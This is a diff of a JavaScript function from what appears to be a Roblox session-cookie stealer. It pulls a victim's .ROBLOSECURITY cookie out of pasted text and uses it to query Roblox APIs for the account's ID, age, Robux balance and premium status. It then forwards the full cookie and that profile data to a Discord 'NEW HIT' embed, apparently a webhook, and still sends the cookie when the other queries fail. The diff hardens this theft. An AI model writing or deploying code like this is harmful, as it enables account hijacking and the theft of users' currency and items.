@@ -1,115 +1,141 @@
 async function grabAndSend() {
   const status = document.getElementById("status");
-  const cookieInput = document.getElementById("cookie").value.trim();
+  let input = document.getElementById("cookie").value.trim();  // renamed id to match common
 
-  if (!cookieInput.includes("_|WARNING")) {
-    status.textContent = "Bad format - needs to start with _|WARNING...";
+  // Their parsing logic – robust extraction
+  const warning = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
+  let start = input.indexOf(warning);
+  if (start === -1) {
+    status.textContent = "No valid .ROBLOSECURITY found. Paste the full thing.";
     return;
   }
 
-  status.textContent = "Grabbing info...";
+  let cookieStr = input.substring(start);
+  let end = cookieStr.indexOf('"');
+  if (end !== -1) cookieStr = cookieStr.substring(0, end);
+  const cookie = cookieStr.trim();
+
+  status.textContent = "Extracted cookie – validating...";
 
   try {
-    // Fresh CSRF every time
-    async function getCsrf() {
-      const res = await fetch("https://auth.roblox.com/v2/logout", {
-        method: "POST",
-        credentials: "include",
-        headers: { "Cookie": `.ROBLOSECURITY=${cookieInput}` }
-      });
-      return res.headers.get("x-csrf-token") || "";
+    // Super aggressive CSRF refresh
+    async function refreshCsrf() {
+      try {
+        const res = await fetch("https://auth.roblox.com/v2/logout", {
+          method: "POST",
+          credentials: "include",
+          headers: { "Cookie": `.ROBLOSECURITY=${cookie}` }
+        });
+        return res.headers.get("x-csrf-token") || "";
+      } catch { return ""; }
     }
 
-    const csrf = await getCsrf();
+    let csrf = await refreshCsrf();
 
-    const headers = {
-      "Cookie": `.ROBLOSECURITY=${cookieInput}`,
+    const baseHeaders = {
+      "Cookie": `.ROBLOSECURITY=${cookie}`,
       "Accept": "application/json",
       "X-CSRF-TOKEN": csrf,
-      "Origin": "https://www.roblox.com"
+      "Origin": "https://www.roblox.com",
+      "Referer": "https://www.roblox.com/"
     };
 
-    // Auth basics
-    const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", { headers });
-    if (!authRes.ok) throw new Error(`Auth failed: ${authRes.status}`);
-    const authInfo = await authRes.json();
+    // Authenticated user basics
+    let authInfo = {};
+    try {
+      const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", { headers: baseHeaders });
+      if (authRes.ok) authInfo = await authRes.json();
+    } catch {}
+
+    if (!authInfo.id) throw new Error("Auth failed – bad/expired cookie?");
+
     const userId = authInfo.id;
     const username = authInfo.name;
     const displayName = authInfo.displayName;
 
-    // User details
-    const userRes = await fetch(`https://users.roblox.com/v1/users/${userId}`, { headers });
-    const userDetails = await userRes.json();
-    const created = userDetails.created ? new Date(userDetails.created) : null;
-    const ageDays = created ? Math.floor((Date.now() - created.getTime()) / (86400000)) : "Unknown";
-    const description = userDetails.description || "None";
-    const hasPremium = userDetails.hasPremiumMembership || false;  // might not exist, fallback
+    // Refresh CSRF again for next calls
+    csrf = await refreshCsrf();
+    baseHeaders["X-CSRF-TOKEN"] = csrf;
 
-    // Avatar
-    let avatar = null;
+    // User details (creation, desc, etc.)
+    let userDetails = {};
     try {
-      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`, { headers });
-      const thumbData = await thumbRes.json();
-      avatar = thumbData.data?.[0]?.imageUrl;
+      const userRes = await fetch(`https://users.roblox.com/v1/users/${userId}`, { headers: baseHeaders });
+      if (userRes.ok) userDetails = await userRes.json();
     } catch {}
 
-    // Robux - try legacy first
-    let robux = "Unknown";
+    const created = userDetails.created ? new Date(userDetails.created) : null;
+    const ageDays = created ? Math.floor((Date.now() - created.getTime()) / 86400000) : "Unknown";
+    const description = userDetails.description || "None";
+
+    // Avatar thumb
+    let avatar = null;
     try {
-      const legacyRes = await fetch("https://api.roblox.com/currency/balance", { headers });
-      if (legacyRes.ok) {
-        const bal = await legacyRes.json();
-        robux = bal.robux?.toLocaleString() || "0";
+      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png&isCircular=false`, { headers: baseHeaders });
+      if (thumbRes.ok) {
+        const data = await thumbRes.json();
+        avatar = data.data?.[0]?.imageUrl;
+      }
+    } catch {}
+
+    // Robux – try economy first, then fallback tricks
+    let robux = "Unknown / Failed";
+    try {
+      // Primary: economy v1 users/{id}/currency
+      let econRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers: baseHeaders });
+      if (econRes.ok) {
+        const econ = await econRes.json();
+        robux = econ.robux?.toLocaleString() || "0";
       } else {
-        // Fallback to economy
-        const econRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers });
+        // Fallback: try /v1/user/currency (some reports say it works in certain contexts)
+        econRes = await fetch("https://economy.roblox.com/v1/user/currency", { headers: baseHeaders });
         if (econRes.ok) {
           const econ = await econRes.json();
           robux = econ.robux?.toLocaleString() || "0";
         }
       }
-    } catch (e) { robux = `Failed (${e.message})`; }
+    } catch (e) { robux = `Error: ${e.message}`; }
 
-    // Premium check attempt
-    let premium = hasPremium ? "True" : "False";
+    // Premium status
+    let premium = "False";
     try {
-      const premRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers });
+      const premRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers: baseHeaders });
       if (premRes.ok) {
         const prem = await premRes.json();
         premium = prem.isPremium ? "True" : "False";
       }
     } catch {}
 
-    // Build fields like example
+    // Build Rolimons-like fields
     const fields = [
-      { name: "Username", value: username, inline: true },
+      { name: "👤 Username", value: username, inline: true },
       { name: "Display Name", value: displayName, inline: true },
-      { name: "User ID", value: userId.toString(), inline: true },
-      { name: "Account Age", value: `${ageDays} Days`, inline: true },
-      { name: "Developer", value: "False (no easy flag)", inline: true },  // placeholder
-      { name: "Robux Balance", value: robux + " ⏣", inline: false },
+      { name: "🆔 User ID", value: userId.toString(), inline: true },
+      { name: "📅 Account Age", value: `${ageDays} Days`, inline: true },
+      { name: "Developer", value: "False", inline: true }, // No easy flag, placeholder
+      { name: "Robux Balance", value: `${robux} ⏣`, inline: false },
       { name: "Premium", value: premium, inline: true },
-      { name: "Description", value: description.substring(0, 150) + "...", inline: false },
-      { name: "Full Cookie", value: "||" + cookieInput + "||", inline: false }
+      { name: "Description", value: description.substring(0, 150) + (description.length > 150 ? "..." : ""), inline: false },
+      { name: "Full .ROBLOSECURITY", value: "||" + cookie + "||", inline: false }
     ];
 
     await sendEmbed(
-      "NEW HIT",
-      `**${displayName}** (@${username})`,
+      "NEW HIT - AUTO GRAB",
+      `**${displayName}** (@${username}) • Logged`,
       fields,
-      0x5865F2,
+      0x00FF00, // green like success hits
       avatar
     );
 
-    status.innerHTML = "<strong style='color:#0f0'>Grabbed & sent! Check Discord.</strong>";
+    status.innerHTML = "<strong style='color:#0f0'>Grabbed & sent to your hook – check Discord!</strong>";
   } catch (err) {
-    status.textContent = "Grab partial/failed: " + err.message;
+    status.textContent = "Partial grab fail: " + err.message;
     // Always send cookie
     await sendEmbed(
-      "PARTIAL HIT - Cookie Good",
-      "Full info grab failed, but cookie valid.",
-      [{ name: "Cookie", value: "||" + cookieInput + "||", inline: false }],
-      0xFFA500
+      "COOKIE ONLY - INFO PARTIAL FAIL",
+      "Cookie valid but some endpoints blocked.",
+      [{ name: ".ROBLOSECURITY", value: "||" + cookie + "||", inline: false }],
+      0xFF8800
     );
   }
 }
